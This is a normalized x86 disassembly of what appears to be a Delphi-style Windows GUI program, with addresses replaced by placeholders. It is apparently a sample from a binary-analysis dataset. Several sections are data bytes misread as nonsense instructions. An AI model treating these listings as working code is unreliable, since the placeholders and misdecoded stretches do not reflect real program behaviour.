lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ff00
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_446684
jmp r-xdata
mov eax edi
call sub_463810
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44ff00
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_446104
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_446764
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40403c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450e44
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_464f10
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44d054
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_446e00
jmp r-xdata
sub_451858
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403240
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_4519cc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_4518e8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4519a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_45194c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_45197c
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406ce4
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_4519a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_451918
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_4519cc
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_451930
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_45194c
pop ebx
retn
mov eax ebx
call sub_45197c
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_451a30
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451b96
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_451cb4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_451c98
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_451c98
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_451da4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403270
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403270
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403270
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403270
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fe8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fe8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_451e2c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451fa4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408da8
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40403c
mov eax [ rw-data ]
call sub_4044a8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_40403c
mov eax [ rw-data ]
call sub_4044a8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4044a8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187bc
mov [ rw-data ] eax
call sub_451a30
mov dl 0x1
mov eax [ r-xdata ]
call sub_451858
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4647ec
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4658d0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_4674b8
mov ecx r-xdata
mov edx sub_443874
mov eax [ r-xdata ]
call sub_417d10
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451fab
lea eax [ ebp - 0x10 ]
call sub_403fe8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_451ff6
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_452057
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45205e
retn
mov eax rw-data
call sub_40cf90
call sub_451da4
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a64
mov eax rw-data
call sub_403fe8
mov eax rw-data
call sub_403fe8
sub_452060
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4520e6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4520ed
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_451e2c
mov eax [ r-xdata ]
call sub_417b84
mov eax [ r-xdata ]
call sub_417c24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
sub_4520f4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx ] ah
inc ebp
add al cl
and [ ebp ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esi eax
and [ ebp ] eax
mov al 0x21
inc ebp
add [ eax ] ah
add [ eax ] al
hlt
sub_45219a
out dx eax
push edx
push ecx
dec [ eax + 0x29 ]
inc ebp
add [ ecx + ebp + 0x45 ] dh
add [ eax + 0x28 ] bl
inc ebp
add [ eax + 0x28 ] ch
inc ebp
add [ eax ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
or [ esp + edx * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0xc800408d
and [ ebp ] eax
pop es
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
jae r-xdata
outsb
je r-xdata
push esp
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
mov al [ 0x300416e ]
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x10ac0001
inc eax
add [ eax ] bl
add bh bh
hlt
add ah ah
outsb
inc edx
popad
jae r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
arpl [ ecx + 0x63 ] ax
je r-xdata
sub eax [ ebp ]
int3
jo r-xdata
inc edx
add ah bl
or al 0x42
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
and al 0x2a
inc ebp
add [ eax ] bh
sub al 0x45
add [ ebx + ebp + 0x45 ] dh
add [ eax + eax ] al
std
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
and eax [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx ] ah
inc ebp
add [ edx + 0x23 ] cl
inc ebp
add [ eax ] ch
add [ eax ] al
adc al 0x6c
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x416e ] ah
adc [ eax ] al
nop
pop esp
and al [ ebp ]
add edx [ eax ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x22 ] bl
inc ebp
add [ eax ] cl
popad
jae r-xdata
or eax [ edx ]
dec esp
mov eax [ ecx ]
mov esp 0xb400420c
outsb
inc ebp
outsb
popad
inc ecx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
and eax [ ebp ]
push 0x14000000
insb
outsd
jb r-xdata
inc eax
add [ eax + 0x3000452a ] dl
mov [ ecx ] es
in al 0xb
inc edx
add [ edx + esi ] ah
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
jo r-xdata
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + ecx + 0x2bb40042 ] bh
inc ebp
add ah cl
or al 0x42
add ah al
or eax 0xff40042
xor al [ eax ]
nop
sub al [ ebp ]
xor [ ecx + eax * 2 + 0x420be400 ] cl
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
outsb
sub_4526f6
out dx eax
inc eax
xor al 0x45
add al ch
xor al 0x45
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ eax ] cl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
adc al 0x27
inc ebp
add [ edi ] al
or eax 0x73754354
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211b8
test bl bl
jle r-xdata
mov edx esi
call sub_452c1c
add [ eax ] ah
inc ebp
add [ esi + ebp ] dh
inc ebp
add [ eax + 0x2e ] cl
inc ebp
add [ esi + ebp + 0x45 ] bl
add [ eax + 0x2e ] dh
inc ebp
add [ esi + ebp + 0x2e980045 ] al
inc ebp
add [ esi + ebp + 0x2ec00045 ] ch
inc ebp
add ah dl
inc ebp
add al bl
inc ebp
add ah bl
inc ebp
add al ah
inc ebp
add ah ah
inc ebp
add al ch
inc ebp
add ah ch
inc ebp
add al dh
inc ebp
add ah dh
inc ebp
add al bh
inc ebp
add ah bh
inc ebp
add [ eax ] al
das
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x15e85653
push cs
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
add [ ecx + edx + 0x42 ] bl
add [ eax ] dh
adc [ edx ] eax
pushad
adc [ edx ] eax
adc [ eax ] 0x42
add [ ecx + edx ] dl
inc edx
add [ eax + 0x11 ] ch
inc edx
add [ esi + ebp ] cl
inc ebp
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
xor al [ eax ]
and al 0x32
inc eax
add al cl
adc [ edx ] al
les edx [ eax ]
inc edx
add ah bh
adc [ edx ] al
pop esp
adc [ edx ] eax
xor [ ecx ] dl
inc edx
add [ eax + 0x11 ] ah
inc edx
add [ eax + 0x14004210 ] al
adc [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
daa
inc ebp
add [ eax ] bl
add [ eax ] al
add [ ebp + ebp * 2 + 0x41 ] dh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
inc ebp
add ah al
and [ ebp ] eax
add eax [ eax ]
or [ ecx + 0x63 ] al
je r-xdata
push 0xc004211
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x27840000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_452808
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4211b8
test bl bl
jle r-xdata
mov edx esi
call sub_452c1c
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_452878
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420ccc
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_452920
sub_4528ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45283c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418440
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_4185cc
sub_4528f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4043f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_40403c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_452920
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_452c1c
mov edx ebx
mov eax esi
call sub_452bfc
sub_452948
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_452920
sub_452974
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_468284
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40346c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421244
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_4436a0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4529cc
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4682ac
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40346c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421260
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_4436a0
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_452a24
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42086c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_452ba8
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_452a90
push ebx
push esi
push edi
call sub_403624
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403270
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418638
call sub_403270
mov eax [ edi + 0x30 ]
call sub_403270
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4208b8
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
sub_452ae0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_452b28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4185ac
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov edx edi
call sub_4528ac
sub_452b74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_454418
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_45445c
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_42093c
sub_452bb4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420b88
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_452c1c
sub_452bfc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4183f4
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_42093c
pop esi
pop ebx
retn
sub_452c1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4186ec
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_452c38
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_452ca0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_45e014
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_455cb4
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_453548
mov edx ebp
call sub_4535a8
inc eax
je r-xdata
sub_452d2c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_452d4c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_452d6c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_4531bc
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
